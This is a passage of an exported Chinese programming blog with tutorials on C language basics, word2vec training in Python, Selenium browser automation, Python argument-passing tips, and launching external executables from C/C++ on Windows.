条件再次被判断。如果为真，则执行循环，这个过程会不断重复（循环主体，然后增加步值，再然后重新判断条件）。在条件变为假时，for 循环终止。 在VC 6.0中不支持在init中声明循环控制变量，只允许使用上面的样例代码，否则会有\n[Error] 'for' loop initial declarations are only allowed in C99 or C11 mode 错误，在比较新版本的编译器中，如下写法是被支持的\nfor (int i=0;i\u003c=100;i++) { ans=ans+1; }//并且，这里的i变量在循环体结束之后就会被释放销毁，即你在循环体之外是无法再次使用i变量的。 while循环 //求1~100内奇数的和 #include\u003cstdio.h\u003e int main(){ int i=1; int ans=0; while (i\u003c=100){ ans+=i; i+=2; } } 执行逻辑\nwhile(condition) { statement(s); } 在这里，statement(s) 可以是一个单独的语句，也可以是几个语句组成的代码块。\ncondition 可以是任意的表达式，当为任意非零值时都为 true。当条件为 true 时执行循环。 当条件为 false 时，退出循环，程序流将继续执行紧接着循环的下一条语句。\ndo while循环 //计算100以内偶数的和 #include\u003cstido.h\u003e int main(){ int i=2; int ans=0; do{ ans+=i; i+=2; }while(i\u003c=100) } 执行逻辑\ndo { statement(s); }while( condition ); 与while循环不同的是，条件表达式出现在循环的尾部，所以循环中的 statement(s) 会在条件被测试之前至少执行一次。\n如果条件为真，控制流会跳转回上面的 do，然后重新执行循环中的 statement(s)。这个过程会不断重复，直到给定条件变为假为止。\n函数 C语言中的函数声明： 返回值类型 函数名(参数类型 参数1,参数类型 参数2 ···){ 函数主体 } 实列： //求a，b中的最大值，并返回该最大值 int Max(int a,int b){ int ret; (a\u003e=b)?ret=a:ret=b;//还记的这个三元运算符吗？ return ret; } 函数调用 #include\u003cstdio.h\u003e int Max(int a,int b) { int ret; (a\u003e=b)?ret=a:ret=b; return ret; } int main() { int a=10,b=20; printf(\"%d\\n\",Max(a,b)); return 0; } 样例输出\n20 函数参数 值传递\nc语言默认多数为是传值调用，把参数的实际值赋给函数内的形式参数，在这种情况下在函数内部修改形式参数的值并不会影响实际参数,例子：\n#include\u003cstdio.h\u003e //函数作用：交换ab的值，这是交换两个数常用写法。 void swap(int a,int b){ int t; t=a; a=b; b=t; } int main(){ int a=10,b=20; printf(\"a=%d,b=%d\\n\",a,b); swap(a,b); printf(\"a=%d,b=%d\\n\",a,b); return 0; } 样例输出\na=10,b=20 a=10,b=20 如你所见，默认情况下在函数内部对传入参数做修改并不会影响实际参数的值\n如果你想真的向修改传入参数的值，那么就要使用下面将会提到的引用传递(引用传递的实质就是指针的运用)\n引用传递\n#include\u003cstdio.h\u003e void swap(int *a,int *b){ int t=*a; *a=*b; *b=t; } int main(){ int a=10,b=20; printf(\"a=%d,b=%d\\n\",a,b); swap(\u0026a,\u0026b); printf(\"a=%d,b=%d\\n\",a,b); return 0; } 样例输出\na=10,b=20 a=20,b=10 作用域规则 作用域指程序定义的变量所存在的区域，超过这个区域，变量就不能被访问。C语言中我们可以在三处地方声明变量：\n在函数或者块（这里的块可以是for循环那个的init还记得吗）内部的局部变量 在所有函数外部的全局变量 在函数参数中定义的形式参数变量 程序查看变量存在并访问的优先级顺序永远是先局部再全局（在某种程度上我们也可以把函数参数声明中定义的形式参数也理解为一种局部变量）\n#include\u003cstdio.h\u003e //全局变量 int g=10; void func1(int g){ printf(\"in func1 g=%d\\n\",g); return; } void func2(){ printf(\"in func2 g=%d\\n\",g); return; } int main(){ //局部变量 int x=20,g=30; printf(\"in main x=%d,g=%d\\n\",x,g); func1(x);//我们把x=20的值赋值给形式参数g func2(); return 0; } 样例输出\nin main x=20,g=30 in func1 g=20 in func2 g=10 在main()函数中尝试访问x,g的值并输出显示，程序优先查看局部变量中是否存在x,g,存在于是输出 in main x=20,g=30 因为局部变量声明了一个g，所以这里并不会访问全局的g 在func1()中我们尝试访问变量g，因为变量g在函数参数部分存在声明，是一个形式参数。所以也不会去访问全局变量g。于是输出 in func1 g=20 即传入的x的值。 在func2()中，我们没有在函数内部声明任何局部变量，形式参数，于是这里尝试访问变量g就是访问的全局变量的值，输出 in func2 g=10 重点\n全局变量被保存在内存的全局存储区中，占用静态存储空间，并且会被初始化。\n局部变量被保存在一种称为栈的结构中，只有在函数被调用的时候才会真正的被分配存储空间\n局部变量被定义的时候，系统不会对其进行初始化（虽然多数情况下不初始化数值也多为0）\n全局变量系统会自动进行初始化，初始化值如下\n数据类型 初始化默认值 int 0 char '\\0' float 0 double 0 pointer(指针) NULL 进阶数据结构 数组 数组，是可以存储大小固定类型相同并且个数固定的顺序集合。\n声明方法：\n数据类型 数组名称[数组大小]; 示例：\nint a[100]; /* 这个实例里我们就定义了一个长度为100的数组，可以存储100个int型数据 */ 注意：C语言中的数组下标从0开始，这里我们定义了一个长度为100的数组a，但是其下标范围事实上是从0到99\n数组初始化\nint a[10]={0}; //声明一个大小为10的整形数组，并初始化所有元素为0 //还记得吗，下标从0开始哦，0~9 double a[]={0.0,1.1,2.2,3.3} //你也可以为数组里每个元素单独初始化，如果你这么做的话还可以省略方括号里的数组大小（这个数组大小为4） int a[10]={0,1,2,3} //如果规定了数组大小但是没有把每个元素单独赋值，未赋值部分依据上面提到的默认初始化规则初始化。 数组元素访问\n#include\u003cstdio.h\u003e int main(){ //声明一个大小为100的int型数组并初始化所有值为0 int a[100]={0}; //将数组所有元素赋值为1~100 for (int i=0;i\u003c100;i++){ //我们通过 数组名[下标] 的方式访问数组元素 a[i]=i+1; } //我们计算数组里所有元素的累加和，即1-100的累加和 int ans=0; for (int i=0;i\u003c100;i++){ ans+=a[i]; } //样例输出5050 printf(\"%d\\n\",ans); return 0; } 数组在函数之间的传参\n#include\u003cstdio.h\u003e //计算a数组内所有元素的平均值 double func(int* a,int size){ double average=0; for (int i=0;i\u003csize;i++) average+=a[i]; return average/(double)size; } /* 其实你可以发现数组传参的方法就是一个“引用传参” 所以数组使用这种方法进行函数传参是可以修改数组元素的 数组函数传参还有别的写法，但是这里只讲解这一种。 希望你养成一个好习惯，数组传参务必带上数组大小 */ int main(){ //声明初始化一个数组a int a[5]={1,2,3,4,5}; //打印平均值 printf(\"%lf\\n\",func(a,5));/ return 0; } 数组的本质（重点）\n数组本质是一个在内存中线性连续的存储空间\n你在声明数组的时候事实上获得的是一个这个空间的地址\n数组下标就是相对于数组地址的一个偏移量用来确定内部元素的位置\nC语言中你要时刻注意数组下标，因为下标越界有时是不会报错的。\n你声明了一个\nint a[10]={0} 的数组，你可以使用如下的循环来遍历它\n#include\u003cstdio.h\u003e int main(){ int a[10]={0}; for(int i=0;i\u003c=10;i++) printf(\"%d \",a[i]); return 0; } 样例输出\n0 0 0 0 0 0 0 0 0 0 1 我设置了循环条件是i\u003c=10,但是你还记得吗？c语言数组下标从0开始！！！\n所以这里输出了11个数字。你也发现了，我明明初始化了所有的数组元素为0，但是最后却多输出了一个1。这里就是因为我们越界访问。\n最后这个数字1不属于数组的元素，但是你依旧可以访问它。\n所以每当你尝试访问数组的时候，请千万注意数组下标越界问题。因为不检查数组下标越界已经在计算机界造成了许许多多的重大安全问题。\n字符数组 字符数组本质还是数组，在大多数情况下和基本数组的操作方式类似。所以接下来我们只讲解字符串数组某些特殊操作。\n字符数组声明以及初始化\n/* 还记的\\0吗，截止符 字符数组内存储的字符串的末尾必须有截止符！ */ char name[6]={'h', 'e', 'l', 'l', 'o', '\\0'}; //你还可以用这个写法. char greeting[]=\"hello\"; //初始化部分元素也是可以滴 char name[20]=\"xiaoming\"; 字符数组的遍历\n因为字符串数组末尾必定有截止符的特性，我们有了一些常用的遍历字符数组的方法：\nchar str[]=\"hello world\"; for (int i=0;str[i]!=0;i++){ ··· } int i=0; while(str[i]!=0){ ··· i++; } 当然你也可以获取字符串长度，然后设定下标i小于等于字符串长度的时候执行循环，不过那样就和普通数组没有区别音次不在此举例。\n字符串的输入输出\nchar str[100]; //输入字符串 gets(str); scanf(\"%s\",\u0026str); //输出字符串 puts(str); printf(\"%s\\n\",str); /* 之前说到在数组处理，越界并不会被报错 所以这里的输入都存在着极大的安全隐患，于是在Visual studio的最新版本里，出于安全考虑 在默认情况下不允许使用以上函数读取字符串。下面提到的C语言字符串处理函数也是一样，都存在了越界问题 因而在最新的VS中默认不允许使用，这也是我不推荐使用最新版本的VS的原因 */ C语言自带的字符串处理函数\n以下函数使用需引入头文件string.h（还记得怎么引入头文件吗？#include\u003cstring.h\u003e） 函数 作用 strcpy(s1,s2); 复制字符串s2到字符串s1 strcat(s1,s2); 连接字符串s2到s1末尾 strlen(s); 获取字符串s长度 strcmp(s1,s2); 如果 s1 和 s2 是相同的，则返回 0；如果 s1\u003cs2 则返回小于 0；如果 s1\u003es2 则返回大于 0。（这里的s1 s2基于字符数组内的字符的字典序判定） strchr(s1,ch); 返回一个指针，只想字符串s1中字符ch第一次出现的位置 strstr(s1,s2); 返回一个指针，指出字符串s1在字符串s2中年第一次出现的位置 重点\nsizeof()与strlen()函数对字符串的差别\nsizeof()函数获取变量所占空间大小\nstrlen()获取字符串长度\nsizeof()函数是可以对任何变量使用的，但是strlen()是字符串专属函数\n#include\u003cstdio.h\u003e #include\u003cstring.h\u003e int main(){ char name[]=\"xiaoming\"; printf(\"size of name=%d\\n\",sizeof(name)); printf(\"strlen of name=%d\\n\",strlen(name)); return 0; } 样例输出\nsize of name=9 strlen of name=8 strlen()函数统计字符数组内存储的字符串长度并且不包括截止符 sizeof()函数统计字符数组所占的空间大小！ 补充:\n#include\u003cstdio.h\u003e #include\u003cstring.h\u003e int main(){ char name[20]=\"xiaoming\"; printf(\"size of name=%d\\n\",sizeof(name)); printf(\"strlen of name=%d\\n\",strlen(name)); return 0; } 样例输出\nsize of name=20 strlen of name=8 结构体 有的时候你可能在想，我需要在程序里存储一个人，或者多个人的身份数据，包括姓名，年龄，出生年月一类的时候咋办？我们当然会希望把这些数据放在一起组织起来，而不是用N多个变量分别存储。于是！结构体就应运而生。\n我们直接以上面的例子来：情景假设我们要存储一个班级学生的信息。\n#include\u003cstdio.h\u003e int main(){ //首先定义一个结构体DATE来存储出生年月 struct DATE{ short year; //年 short month;//月 short day; //日 }; //定义学生信息结构体StudentInfo struct StudentInfo{ char name[20]={0}; //姓名 DATE date; //出生年月，对!结构体也可以嵌套定义 }; //对，我们要存储一个班的学生，50人 StudentInfo student[50]; for (int i=0;i\u003c50;i++){ printf(\"输入第%d个学生信息：\\n\",i+1); //我们使用结构体名称加“.”的方式来访问结构体内部元素 printf(\"学生姓名：\"); scanf(\"%s\",\u0026student[i].name); printf(\"学生出生年月日：\"); scanf( \"%d-%d-%d\", \u0026student[i].date.year, \u0026student[i].date.month, \u0026student[i].date.day ); }; for (int i=0;i\u003c50;i++){ printf(\"%s\\n\",student[i].name); printf( \"%d-%d-%d\", student[i].date.year, student[i].date.month, student[i].date.day ); }; return 0; } 样例输入\n输入第1个学生信息： 学生姓名：xiaoming 学生出生年月日：1992-12-21 样例输出\nxiaoming 1992-12-21 我们通过如下格式声明结构体\nstruct 结构体类型名{ 基本数据类型 变量名; 基本数据类型 变量名; ... } 结构体的声明，其实只是定义了一个由用户个人定义的一种数据类型，我们真正要使用的时候还需要重新真正声明一个结构体实际变量.正如上面代码例子中给出的那样。 除了上述的声明结构体实际变量的写法，我们还有如下几种其他方式 //如此我们在声明一个DATE结构体类型的同时，声明了一个date的结构体实体变量 stuct DATE{ int year; int month; int day; }date; //如果我们并不打算在别的地方使用这种结构体类型，只是单纯的为了声明这样一个结构体实体变量，还可以省略结构体类型名称 struct{ int year; int month; }date1; //这个还是定义一个结构体类型DATE typedef stuct{ int year; int month; }DATE; 枚举结构 这是本垃圾博主很少使用的一种结构\nenum WEEK{ Monday=1, Tuesday, Wednesday, Thursday, Friday, Saturday, Sunday } WEEK day; /* 你也可以使用这种写法多写一个单词 enum WEEK day; 当然也可以像结构体一样声明枚举类型，到实体化枚举变量一气呵成 enum WEEK{ Monday=1, Tuesday, Wednesday, Thursday, Friday, Saturday, Sunday } day; */ 第一个枚举类型成员值默认为整形0，后续枚举成员默认值为前一个成员+1. enum season {spring, summer=3, autumn, winter}; 没有指定值的枚举元素，其值为前一元素加 1。也就说 spring 的值为 0，summer 的值为 3，autumn 的值为 4，winter 的值为 5 指针 无数萌新惨死在这里\n指针是一种变量类型，这种类型可以存储另一个变量的地址，地址即另一个变量在内存中的位置\n你可以使用指针里存储的地址来访问另一个变量的值，修改另一个变量\n声明方法 基础数据类型 *变量名 举例1： int *p0; short *p1; long *p2; char *p3; float *p4; 基本的数据类型都可以声明其对应的指针变量\n一种类型的指针变量只可以存储对应类型变量的地址。列如int*型的指针变量，所存储的地址指向的位置必定存储的也是一个int型的数据\n举例2：\nstruct TEST{ int a,b; }; TEST* p0; 我们也可以声明一个结构体类型，并且声明一个指向该结构体类型的指针变量\n指针使用 基本使用 #include\u003cstdio.h\u003e int main(){ int *p=NULL; //声明指针变量，并初始化为NULL（即0）NULL是C语言里约定的空指针值 int a; //声明一个正常整形变量 a=1; //将a赋值为1 p=\u0026a; //将a的地址赋值给指针变量 //\u0026 符号，取变量的地址 printf(\"a=%d\\np=%p\\n*p=%d\",a,p,*p); a=22; //改变a的值 printf(\"\\na=%d\\np=%p\\n*p=%d\",a,p,*p); return 0; } 样例输出 a=1 //a的值 p=000000000062FE44 //p的值，即a的地址 *p=1 //p所指向的地址所存储的值，即a的值 a=22 p=000000000062FE44 //同上 *p=22 更多c语言指针相关教程 文件操作 程序是用了来处理数据的，而数据实质就是存储在磁盘上的文件，因而文件操作是程序员必须学习的基础 FILE *f=NULL; //声明一个文件指针 char buff[100]; //声明一个字符串数组 char ch; //声明一个字符变量 int x; //声明一个整形变量 f=fopen(\"test.txt\",\"wr\"); //打开文件，“wr”指定可读可写 ch=fgetc(f); //从文件中读取单个字符赋值给ch fscanf(f,\"%s\",buff); //从文件中读取字符串赋值给buff字符串数组 fscanf(f,\"%d\",\u0026x); //从文件中读取一个整形变量 fgets(buff,100,f); //从文件中读取字符串，并存放到buff中，指定最大长度100 fprintf(f,\"%s\\n\",buff); //向文件中写入字符串数组 fputc(ch,f); //向文件中写入单个字符 fputs(buff,f); //向文件中写入字符串 后记 指针我这里暂时咕了，指针可以说是c语言的精髓，也意味着贯穿了整个c语言的所有内容，如果完成指针部分可能又花当前篇幅的一半。所以这里只有一个最最最基础的指针使用。如果你还需要详细的指针学习，推荐你前往这里,或许之后我也可能会把指针单独独立的讲解一次。\n写着整个教程花了我接近三天的时间，而且越是到后面意志越是消沉（所以我写到指针咕咕咕了）\n而且我知道这样实在是一个写的不怎么样的教程。\n本教程尽量挑选了基础性的，使用较为常见的知识点进行讲解，并以本人自认为合适的一种顺序组织安排了全部内容\n如果这篇博客能帮到你，非常高兴。\n如果觉得博客有问题，欢迎邮件交流。\n","description":"","tags":["C/C++"],"title":"C语言基础精炼","uri":"/posts/c%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E7%B2%BE%E7%82%BC/"},{"categories":["Code"],"content":" 概述 最近踩坑机器学习神经网络中的文本处理,所以有了这篇博客.记录一下基于python word2vec训练中文词向量的方法(英文也同样适用) 虽然事后我发现我需要的并不是词向量word2vec,而是训练获得句子向量的方法,权当做个预告吧(咕咕咕)\n词向量训练:在自然语言处理中将每个单词映射到一个空间向量过程,从而获得每个词汇之间的关联性.(可能说的不太对,大概就这样吧,不是理论帝)\nStart python:3.5+ 安装相应依赖\npip install jieba pip install gensim jieba用于中文文本分词,英文可直接使用空格分割分词 gensim词向量训练模块 数据预处理\ndef load(): with open(\"./train.tsv\",\"r\",encoding=\"utf-8\") as f: lines=f.readlines() f.close() return lines return None 这里采用的数据格式是以'\\t'分割的tsv文件,每一行包含一个句子以及其对应标签.这里将二者共同训练\n分词并去除停止词\n停止词:指句子中的语气词,特殊符号,数字等对句子意义判别无帮助的词汇,这里推荐几个常用的中文停止词表,你也可以一句自己项目需要自己制作适合的停止词表Github # 导入结巴分词 import jieba # 读取停止词表函数,停止词表为一行一个的格式 def load_stopwords(): with open(\"./stopwords.txt\",\"r\",encoding=\"utf-8\") as f: words=f.readlines() f.close() return words return None # 装载停止词表 stopowrds=load_stopwords() # 分词去除停止词函数,lines为上一步中读取的单行数据,将所有的分词保存到文本文件中为下一步训练备用 def cut(lines): with open(\"cutwords.txt\",\"w+\",encoding=\"utf-8\") as f: for line in lines: words=jieba.cut(line) #去除停止词 for i in words: if i in stopwords: words.remove(i) f.write(\" \".join(words)) f.wirte(\"\\n\") 模型训练\n# 导入词向量训练模块 from gensim.models import word2vec from gensim.models.word2vec import LineSentence # 训练函数 def model_train( sentence_in=sentence, # 需要训练的数据 size_in=300, # 生成的词向量维数,训练数据量越大,推荐数值越大 window_in=5, # 滑动窗口大小,涉及到单个词语关联前后单词的数目 min_count_in=2, # 字典截断,出现次数少于该数值的词汇会被放弃 iter_in=5 # 迭代次数 ): print(\"start traing...\") model=word2vec.Word2Vec( sentences=sentence_in, size=size_in, window=window_in, min_count=min_count_in, workers=multiprocessing.cpu_count(), iter=iter_in ) print(\"traing complete...\") return model # 从之前完成分词的数据中装载训练数据,模型sentence参数可以是一个list # 但是大批量数据时建议使用word2vec自带的类型导入 sentence=LineSentence(\"./cutwords.txt\") model=model_train(sentence,300,5,2,5) 保存模型\n# 参数为保存的文件名 model.save(\"modeltest\") 模型的二次训练\n# 读取模型 model = gensim.models.Word2Vec.load('modeltest') # 追加训练 model.train(more_sentences) 模型使用\n# 根据给定的词汇给出10个最相近的词汇 model.most_similar(\"男人\") # 找出离群词 model.doesnt_match(\"测试\") # 计算两个词汇相似度 model.similarity('男人', '女人') # 获得单个词汇的词向量 model['男人'] ","description":"","tags":["Python","机器学习"],"title":"word2vec词向量训练","uri":"/posts/word2vec%E8%AF%8D%E5%90%91%E9%87%8F%E8%AE%AD%E7%BB%83/"},{"categories":["Code"],"content":"概述 本文记录一些有关python高阶爬虫selenium+浏览器爬虫操作的踩坑记录.\nselenium\n本质是一个为了自动化测试而诞生的工具,但没想到ta自身作为一个爬虫也是极具优势的.\nselenium简单的说就是通过各种webdirver驱动去控制浏览器去访问网站,完成各种操作,从而达到爬取数据的目的.可以有效的规避多数反爬虫机制,列如用js动态生成的网站\nStart python version:3.5+\nbrowser:Chrome\nwebdriver:chromedriver\nplatform:Windows 10\n首先安装selenium包\npip install selenium 在命令行中尝试引入selenium库,如果不报错证明安装成功\nimport selenium 依据你准备选用的浏览器下载对应版本的webdriver.本文以chrome浏览器为例,依据chrome浏览器版本下载对应的chromedriver\nchromedriver download\n关于webdriver的配置.\nwebdriver事实上是一个可执行文件,为了能够让程序调用它,所以需要配置其环境变量.win下最偷懒的方法自然是把ta丢进system32里.\n当然有高阶操作可以装载指定目录中的webdriver,以及可以指定浏览器可执行文件目录等,这部分操作参见自定义webdriver以及浏览器可执行文件\n让我们开始第一个例子打开百度首页\n#-*- coding:utf-8 -*- # 从selenium包中导入webdriver from selenium import webdriver # 声明一个chrome对象 dirver=webdriver.Chrome() # 用chrome打开百度首页 driver.get(\"https://www.baidu.com/\") 更多基础操作\n容我偷个懒\nAdvance 其实也就是一系列踩坑行为\n自定义webdriver以及浏览器可执行文件 #-*- coding:utf-8 -*- from selenium import webdirver # 声明一个chrome设置对象 options=webdriver.ChromeOptions() # 指定浏览器可执行文件路径 options._binary_location=\"./Application/chrome.exe\" # 利用chrome设置对形象作为参数初始化webdriver对象,executable_path即webdriver路径 chrome=webdriver.Chrome(chrome_options=options,executable_path=\"./chromedriver.exe\") # 打开百度首页 chrome.get(\"https://www.baidu.com/\") 不指定浏览器可执行文件目录,默认启动系统浏览器.个人拙见为了软件的移植性下载32位版本的二进制可执行文件放在脚本下属目录,使用参数指定浏览器可执行文件路径 设置浏览器启动参数 普通参数\n#-*- coding:utf-8 -*- from selenium import webdirver # 声明一个chrome设置对象 options=webdriver.ChromeOptions() # 禁用gpu加速 options.add_argument(\"--disable-gpu\") # 允许加载不安全内容 options.add_argument('--allow-running-insecure-content') # 禁用插件 options.add_argument('--disable-extensions') # 使用无头浏览器,即不显示浏览器图形化界面,适用于没有图形化界面的服务器 options.add_argument('--headless') chrome=webdriver.Chrome(chrome_options=options) 实验性参数\nappState = { \"recentDestinations\": [ { \"id\": \"Save as PDF\", \"origin\": \"local\" } ], \"selectedDestinationId\": \"Save as PDF\", \"version\": 2 } profile = { 'printing.print_preview_sticky_settings.appState': json.dumps(appState) } options.add_experimental_option(\"prefs\",profile) 更多启动参数设置参见文档\n执行JavaScript脚本\n#-*- coding:utf-8 -*- from selenium import webdirver chrome=webdriver.Chrome() # 设置js代码执行超时时间 chrome.set_script_timeout(30) chrome.get(\"http://www.baidu.com/\") # 异步执行js代码 chrome.execute_script(\"alert(\"Halloworld\");\") # 阻塞执行js代码 chrome.execute_async_script(\"alert(\"halloworld\");\") execute_script函数是异步执行js代码. execute_async_script是阻塞执行,即会等待js执行完成再执行接下来的程序. set_script_timeout是设置js执行超时时间,对于阻塞执行的js代码,在timeout设定的时间内没有能够完成将强行终止.这个timeout值默认是30s ","description":"","tags":["Python","爬虫","selenium"],"title":"高阶爬虫selenium摘记","uri":"/posts/%E9%AB%98%E9%98%B6%E7%88%AC%E8%99%ABselenium%E6%91%98%E8%AE%B0/"},{"categories":["Code"],"content":"Python常用技能汇总 这里是一些写python脚本时常用的小技巧,长期更新 咕咕咕 获取脚本目录 脚本运行时相对路径时基于命令行的路径.这样直接在脚本里使用相对路径会出现问题.我们可以使用如下方法获得脚本所在的绝对路径,以及脚本本身的文件名. import os WORK_PATH,FILE_NAME=os.path.split(os.path.abspath(__file__)) WORK_PATH中就存储了脚本所在的绝对路径 FILE_NAME中就是脚本名称 获取Windows用户目录 有时我们需要获取用户默认的下载目录,或者是文档目录等等 import os USER_PATH=os.path.expanduser(\"~\") DOWNLOAD_PATH=ps.path.join(os.path.expanduser(\"~\"),\"Download\") USER_PATH中存储了用户目录的绝对路径 DOWNLOAD_PATH中存储了用户默认下载目录(如果用户没有自己重命名这个文件夹的话) Python参数传递中的*args以及**kwargs 事实上真正的python参数传递语法是* 和 **。*args和**kwargs是我们一种约定俗成的写法。\n*args *args用来表示函数接受可变长度的 非关键字 参数作为函数的输入\ndef test(normal_arg, *args): print(\"first normal arg:\"+normal_arg) for i,x in enumerate(args): print(\"{} arg is {}\".format(i+1,x)) test(\"normal\",\"a\",\"b\",\"c\",\"d\") 样例输出\nfirst normal arg:normal 1 arg is a 2 arg is b 3 arg is c 4 arg is d **kwargs **kwargs表示函数接受可变长度的关键字参数字典作为参数，即可以简单的理解为传入的是字典参数 def test(**kwargs): if kwargs is not None: for key, value in kwargs.iteritems(): print(\"{} = {}\".format(key,value)) # Or you can visit kwargs like a dict() object # for key in kwargs: # print(\"{} = {}\".format(key, kwargs[key])) test(name=\"python\", value=\"5\") 样例输出 name = python value = 5 What's more 我们也可以使用这两个参数来调用一般参数格式的函数\ndef func(arg1,arg2,arg3): print(\"arg1: \" + arg1) print(\"arg2: \" + arg2) print(\"arg3: \" + arg3) args_list=(\"python\",2,3) func(*args_list) print(\"==================\") kwargs_dict={\"arg3\": 3, \"arg1\": \"python\", \"arg2\": 2} func(**kwargs_dict) 样例输出:\narg1: python arg2: 2 arg3: 3 ================== arg1: python arg2: 2 arg3: 3 本段参考简书 https://www.jianshu.com/p/be92113116c8\n","description":"","tags":["Python"],"title":"Python常用Skill","uri":"/posts/python%E5%B8%B8%E7%94%A8skill/"},{"categories":["Code"],"content":" 摘要 最近在采坑某个项目，需要用到调用外部写好的exe运行，项目基于c语言，于是就有了关于VC++调用外部程序并获取程序命令行运行输出的问题\n本文将围绕windows下调用外部exe程序的常见的几种方法展开。部分方法可能也适用于linux平台。\n虽然到最后我的项目也没能具体应用上这项技术\n本文将会涉及到的主要函数:\nsystem() winexec() ShellExecute() CreateProcess() 综述 在调用外部exe程序的同时还想要获得程序运行过程中的输出内容。本文介绍的主要是使用管道的方法。不涉及内存共享等一类的方法。\n本文中假定所有的父程序即parent.exe；子程序为child.exe\n子程序源码 #include\u003ciostream\u003e using namespace std; int main(int argc, char* arg[]){ int x=argc; cout\u003c\u003cx\u003c\u003cendl; for(int i=0;i\u003cx;i++) cout\u003c\u003carg[i]\u003c\u003cendl; return 0; } System() 这是c/c++的标准函数之一，可以执行命令行命令。也可以在linux下调用。详情文档参见cplusplus\n函数原型\nint system(const char* command) 调用命令处理器执行命令，win下可以理解为调用cmd.exe。如果执行的命令参数为空，该函数会检测命令处理器是否可用。\n返回值：\n如果命令参数为空，如果命令处理器可用该函数返回一个非零值。反之返回0\n如果命令参数不为空，返回值取决于你所执行的命令。\n调用子程序并获得其回显\n这里使用的是默认的命令行将所有的命令执行的输出结果重定向到result.txt中，之后我们只需要使用文件操作读取result.txt中的内容即可。\n坑： 命令行重定向输出到文件采用的是末尾追加的打开方式，为了保证程序每次执行结果不受上次执行结果的干扰，建议每次在读取完result.txt中的内容之后将文件清空。\n#include\u003ciostream\u003e #include\u003ccstdlib\u003e #include\u003cfstream\u003e using namespace std; int main(){ char buffer[4096]={0}; //用于文件读取 system(\".\\\\child.exe argv1 argv2 argv3 \u003e\u003e.\\\\result.txt\");//执行子程序并传入参数 fstream file(\".\\\\result.txt\"); //读取结果文件 while(file.is_open() \u0026\u0026 !file.eof()){ file.read(buffer,4096); cout\u003c\u003cbuffer\u003c\u003cendl; } file.clear(); //清空文件内容方便下次读取 file.close(); //关闭文件 } 父程序输出样例\n4 .\\child.exe argv1 argv2 gv3 参数0为程序本身，参数1为传入的参数 坑： 为森魔丢了argv3的ar？？？我也不知道，大佬了解的可以解答一下。result.txt里是全的，读取文件出了问题？？？\nWinExec() Windows API 函数（个人建议微软爸爸的函数还是看微软爸爸的文档最合适）\n函数原型：\nUINT WinExec( LPCSTR lpCmdLine, //你所要执行的命令 UINT uCmdShow //显示模式，设置不同的参数可以实现控制台隐藏等等 ); 返回值：如果函数成功，则返回值大于31。 如果函数失败，则返回值会表示错误类型，详情参见文档 调用子程序并获得其回显\n总的来说这个命令和system类似，只是多了一个显示模式的参数，可以做到隐藏控制台等等一系列的操作（具体参见微软文档）获取回显的方式依然是使用输出重定向到文本文件并读取的方式。注意点同上，因为使用的是文末追加的方式，最好每次读取完之后清空输出的文本内容。\n#include\u003ciostream\u003e #include\u003cwindows.h\u003e //WinExec函数头文件 #include\u003cfstream\u003e using namespace std; int main(){ char buffer[4096]; WinExec(\".\\\\child.exe argv1 argv2 argv3 \u003e\u003eresult.txt\",SW_SHOW); fstream file(\".\\\\result.txt\"); while (file.is_open() \u0026\u0026 !file.eof()){ file.read(buffer,4096); cout\u003c\u003cbuffer\u003c\u003cendl; } file.clear(); //清空输出文件内容 file.close(); return 0; } 父程序输出样例\n5 .\\child.exe argv1 argv2 argv3 \u003e\u003eresult.txt 可以看得出来system()和WinExec()的差别，WinExec()会把最后重定向输出到文本文件也作为一个参数。\nShellExecute() Window API函数，详情文档参见微软官方文档\n函数原型\nHINSTANCE ShellExecuteA( HWND hwnd, //程序的窗口句柄，可以使用GetDesktopWindow()函数获取，也可以填写NULL LPCSTR lpOperation, //你所要执行的操作，Shellexecute不光是可以运行外部程序那么简单，它还可以操作文件等等，具体取决于这个参数的设置 LPCSTR lpFile, //你所要操作的文件名称 LPCSTR lpParameters,//操作传入的参数 LPCSTR lpDirectory, //你所要操作的文件所在的文件夹，可以理解为工作目录 INT nShowCmd //显示参数 ); 坑： 你可以在lpFile参数中直接写全文件路径，这样的话文件的工作目录就会是父程序的工作目录。如果不屑写全的话可以在lpFile中写上文件名，lpDirectory中写明文件所在路径。这样的话启动的子程序的默认工作路径也得到了指定。\n返回值： 函数返回一个HINSTANCE(实质是一个无符号的整形)，大于32表明子程序调用成功，小于32则表明调用失败。微软官方文档有详情解释每个错误的返回值的含义。 调用子程序\n但并不能获取回显！！！ 网上某些论坛博客里有人用这个函数调用外部exe并使用将输出重定向到文本文件的方式获取输出的返回内容，但是本人实践并未成功。如有大佬知道原因欢迎指正！\n#include\u003ciostream\u003e #include\u003cwindows.h\u003e //WinExec函数头文件 using namespace std; int main(){ HINSTANCE ret; ret=ShellExecute( GetDesktopWindow(), //获取窗口句柄 \"open\", //指定操作 \"child.exe\", //程序文件名称 \"argv1 agr2 argv3\", //命令行参数 \".\\\\\", //程序所在目录 SW_HIDE //子程序显示模式 ); return 0; } ShellExecuteEx() Window API函数，详情文档\n这个函数是ShellExecute的扩展函数 可以实现阻塞调用子程序 函数原型\nBOOL ShellExecuteExW( SHELLEXECUTEINFOW *pExecInfo //指向SHELLEXECUTEINFO结构体的指针，该结构体中包含你所要调用的程序的相关信息 ); 返回值：显而易见，True表示执行成功，反之，失败. 调用子程序示例\n同样不可以使用重定向输出到文件的方式获取程序执行输出\n#include\u003ciostream\u003e #include\u003cwindows.h\u003e //shellapi.h你也可以使用这个头文件，shellapi.h包含在windows.h这个头文件内。 using namespace std; int main(){ SHELLEEXECUTEINFO shellinfo; ZeroMemory(\u0026shellinfo,sizeof(SHELLEXECUTEINFO)); //初始化结构体数据 shellinfo.cbSize=sizeof(SHELLEXECUTEINFO); //cbSzie存储结构体大小 shellinfo.fMask=SEEK_MASK_NOCLOSEPROCESS; //标志表明其他结构成员的内容和有效性,SEEK_MASK_NOCLOSEPRCESS指明使用hProcess接收进程句柄 shellinfo.hwnd=GetDesktopWindow(); //获取窗口句柄 shellinfo.lpVerb=\"open\"; //指定操作类型，同上面的lpOperation shellinfo.lpFile=\"child.exe\"; //指定文件名 shellinfo.lpParameters=\"agrv1 argv2 argv3\"; //传入子程序的参数 shellinfo.lpDirectory=\".\\\\\"; //子程序工作目录 shellinfo.nShow=SW_HIDE; //子程序窗体显示，SW_HIDE隐藏 shellinfo.hInstApp=NULL; //如果SEEK_MASK_NOCLOSEPROCESS参数被设置，该参数用于接收返回子程序的执行情况，类似ShellExecute函数的返回值 BOOL 